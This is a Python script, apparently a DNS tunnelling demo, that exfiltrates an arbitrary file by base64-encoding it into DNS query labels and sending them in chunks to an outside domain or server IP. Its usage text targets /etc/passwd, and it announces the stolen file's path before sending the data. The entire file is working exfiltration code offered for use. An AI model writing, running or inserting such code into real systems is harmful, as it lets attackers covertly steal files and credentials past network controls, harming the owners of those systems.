#!/usr/bin/env python3
'''
DNS-based file exfiltration client (pure dnslib)

Usage:
• dig‑style (auto‑use local resolver):
    python3 client.py /etc/passwd dnsdemo.andrewrea.co.uk
• With explicit server IP:
    python3 client.py /etc/passwd 52.56.139.78 dnsdemo.andrewrea.co.uk
• With prefix:
    python3 client.py /etc/passwd dnsdemo.andrewrea.co.uk --prefix server01
'''

import argparse, base64, os, socket, time, traceback, re
from typing import Optional, List
from dnslib import DNSRecord, QTYPE

MAX_LABEL = 63
MAX_QNAME = 253  # DNS max query name length

# ────────────────────────── utilities
def to_labels(data: bytes, domain: str) -> List[str]:
    b64 = base64.urlsafe_b64encode(data).decode().rstrip("=")
    labels = []
    i = 0
    while i < len(b64):
        chunk = b64[i:i+MAX_LABEL]
        labels.append(chunk)
        i += MAX_LABEL
        # check if we're about to exceed max QNAME length
        qname_len = sum(len(l) + 1 for l in labels) + len(domain) + 1  # +1 for dot before domain
        if qname_len >= MAX_QNAME - 10:  # safety margin
            break
    return labels


def validate(qname: str) -> None:
    for label in qname.split('.'):
        if len(label) > MAX_LABEL:
            raise ValueError(f"Label too long: {label}")


# DNS A/NS resolution using dnslib (kept for explicit-IP mode helper)

def _resolve_first(name: str, rtype: str) -> Optional[str]:
    try:
        q = DNSRecord.question(name, qtype=rtype)
        raw = q.send('8.8.8.8', 53, timeout=2)
        for rr in DNSRecord.parse(raw).rr:
            if QTYPE[rr.rtype] == rtype:
                return str(rr.rdata)
    except Exception as e:
        print(f"[!] DNS {rtype} lookup failed for {name}: {e}")
    return None


def resolve_ip(domain: str) -> Optional[str]:
    print(f"[DEBUG] Resolving {domain}")
    ip = _resolve_first(domain, 'A')
    if ip:
        print(f"[DEBUG] Resolved A {domain} → {ip}")
        return ip
    ns = _resolve_first(domain, 'NS')
    if ns:
        ip = _resolve_first(ns.rstrip('.'), 'A')
        if ip:
            print(f"[DEBUG] via NS {ns} → {ip}")
            return ip
    print('[!] No usable A/NS glue')
    return None


# ────────────────────────── pick system resolver like dig

def default_resolver() -> str:
    """
    Return the first nameserver listed in /etc/resolv.conf.
    Fall back to 8.8.8.8 if nothing is found.
    """
    try:
        with open('/etc/resolv.conf') as f:
            for line in f:
                m = re.match(r'^\s*nameserver\s+(\S+)', line)
                if m:
                    return m.group(1)
    except Exception:
        pass
    return '8.8.8.8'


# ────────────────────────── send DNS query to IP

def send(qname: str, server_ip: str) -> None:
    try:
        validate(qname)
        pkt = DNSRecord.question(qname, qtype='A').pack()
        addr = (server_ip, 53)
        print(f"[DEBUG] Sending to {server_ip} → {qname}")
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.settimeout(2)
            s.sendto(pkt, addr)
    except Exception as e:
        print(f"[!] Send failed to {server_ip} for {qname}: {e}")
        traceback.print_exc()


# ────────────────────────── main logic

def exfil(file_path: str, srv_or_dom: str, dom: Optional[str], delay: float, prefix: Optional[str]) -> None:
    if dom is None:
        # two-argument form: use system resolver like dig
        base_domain = srv_or_dom
        server_ip = default_resolver()
        print(f"[✓] Using system resolver → {server_ip}")
    else:
        # three-argument form: explicit DNS server IP then domain
        server_ip = srv_or_dom
        base_domain = dom
        print(f"[✓] Using explicit server → {server_ip}")

    # Construct the domain used in queries
    full_domain = f"{prefix}.{base_domain}" if prefix else base_domain
    print(f"[✓] Using domain → {full_domain}")

    if not os.path.isfile(file_path):
        print(f"[!] File not found: {file_path}")
        return

    data = open(file_path, 'rb').read()

    # 1️⃣ path announcement
    path_token = file_path.strip('/').replace('/', '_')
    send(f"path.{path_token}.{full_domain}", server_ip)
    time.sleep(delay)

    # 2️⃣ chunked transfer
    index = 0
    offset = 0
    while offset < len(data):
        chunk_size = 48  # safe chunk size
        chunk = data[offset:offset+chunk_size]
        labels = to_labels(chunk, full_domain)
        qname = '.'.join(labels + [str(index), full_domain])
        print(f"[+] chunk {index}")
        send(qname, server_ip)
        offset += chunk_size
        index += 1
        time.sleep(delay)

    # 3️⃣ eof
    send(f"eof.{full_domain}", server_ip)
    print(f"[✓] Sent {index} chunks → {server_ip}")


# ────────────────────────── CLI entry

if __name__ == '__main__':
    ap = argparse.ArgumentParser(description='dnslib exfil client')
    ap.add_argument('file')
    ap.add_argument('server_or_domain')
    ap.add_argument('domain', nargs='?', help='base domain (omit to use system resolver)')
    ap.add_argument('--delay', type=float, default=0.0)
    ap.add_argument('--prefix', type=str, default='', help='Optional prefix (e.g., hostname or env)')

    args = ap.parse_args()
    exfil(args.file, args.server_or_domain, args.domain, args.delay, args.prefix)

